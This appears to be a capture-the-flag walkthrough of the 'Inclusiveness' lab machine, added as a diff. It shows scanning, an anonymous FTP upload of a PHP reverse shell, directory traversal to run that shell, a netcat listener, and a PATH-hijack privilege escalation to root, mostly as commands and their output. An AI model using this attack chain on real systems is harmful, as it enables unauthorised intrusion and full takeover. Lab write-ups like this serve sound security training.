@@ -1,0 +1,156 @@
+NMAP SCAN
+=====================
+# nmap -sC -sV 192.168.58.14
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub [NSE: writeable]
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.58.200
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:1b:a3:92:83:a5:7a:15:bd:40:6e:0c:8d:98:27:7b (RSA)
+|   256 cb:38:83:26:1a:9f:d3:5d:d3:fe:9b:a1:d3:bc:ab:2c (ECDSA)
+|_  256 65:54:fc:2d:12:ac:e1:84:78:3e:00:23:fb:e4:c9:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 00:50:56:BF:5F:8C (VMware)
+
+FTP SCAN
+=====================
+Am excited to logon to ftp and drop a reverse shell.
+This is a successful but how to run the shell is the real deal.
+# ftp 192.168.58.14
+ftp> cd pub
+250 Directory successfully changed.
+ftp> put shell.php
+local: shell.php remote: shell.php
+229 Entering Extended Passive Mode (|||21173|)
+150 Ok to send data.
+100% |********************************|  3462      122.28 MiB/s    00:00 ETA
+226 Transfer complete.
+3462 bytes sent in 00:00 (5.07 MiB/s)
+
+
+DIRECTORY SCAN
+=====================
+# gobuster dir -u http://192.168.58.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+/manual        (Status: 403) [Size: 279]
+/robots-txt 
+
+visiting the site at /robots.txt I see warning error:
+You are not a search engine! You can't read my robots.txt! 
+
+After research I learn that if I pass the agent as a search engine then I will get something back
+$ curl http://192.168.58.14/robots.txt -A 'Google' -vv
+*   Trying 192.168.58.14:80...
+* Connected to 192.168.58.14 (192.168.58.14) port 80 (#0)
+> GET /robots.txt HTTP/1.1
+> Host: 192.168.58.14
+> User-Agent: Google
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Wed, 30 Mar 2022 08:50:21 GMT
+< Server: Apache/2.4.38 (Debian)
+< Last-Modified: Sat, 08 Feb 2020 03:26:11 GMT
+< ETag: "2d-59e08115bb1ef"
+< Accept-Ranges: bytes
+< Content-Length: 45
+< Content-Type: text/plain
+< 
+User-agent: *
+Disallow: /secret_information/
+* Connection #0 to host 192.168.58.14 left intact
+
+Onwards, I visit the /secret_information/.
+Here there is a lot of text on DNS. Clicking on english gives access to directory traversal.
+Finally found a way to run the reverse shell.
+
+USER FLAG
+=====================
+From the browser traverse to the ftp directory 
+192.168.58.14/secret_information/?lang=../../../../../../var/ftp/pub/shell.php
+
+On the attacking machine open a netcat session and you get a shell back.
+# nc -lvnp 1234
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+That's it, user flag obtained.
+
+PRIV ESCALATION
+=====================
+Interestingly there is a c script and a compiled version on tom home directory.
+Analysing it I observe that this checks if logged user is tom and then runs.
+www-data@inclusiveness:/dev/shm$ cat /home/tom/rootshell.c
+cat /home/tom/rootshell.c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+
+    printf("checking if you are tom...\n");
+    FILE* f = popen("whoami", "r");
+
+    char user[80];
+    fgets(user, 80, f);
+
+    printf("you are: %s\n", user);
+    //printf("your euid is: %i\n", geteuid());
+
+    if (strncmp(user, "tom", 3) == 0) {
+        printf("access granted.\n");
+        setuid(geteuid());
+        execlp("sh", "sh", (char *) 0);
+    }
+}
+
+cd /tmp
+www-data@inclusiveness:/tmp$ echo "printf 'tom'" > whoami
+echo "printf 'tom'" > whoami
+www-data@inclusiveness:/tmp$ cat whoami
+cat whoami
+printf 'tom'
+www-data@inclusiveness:/tmp$ chmod 777 whoami
+chmod 777 whoami
+www-data@inclusiveness:/tmp$ cd /home/tom
+cd /home/tom
+www-data@inclusiveness:/home/tom$ export PATH=/tmp:$PATH
+export PATH=/tmp:$PATH
+www-data@inclusiveness:/home/tom$ /home/tom/rootshell
+/home/tom/rootshell
+checking if you are tom...
+you are: tom
+access granted.
+# id
+id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# sudo su
+sudo su
+root@inclusiveness:/home/tom# cd /root
+cd /root
+
+Root flag obtained!
+
+
+
+
+
+
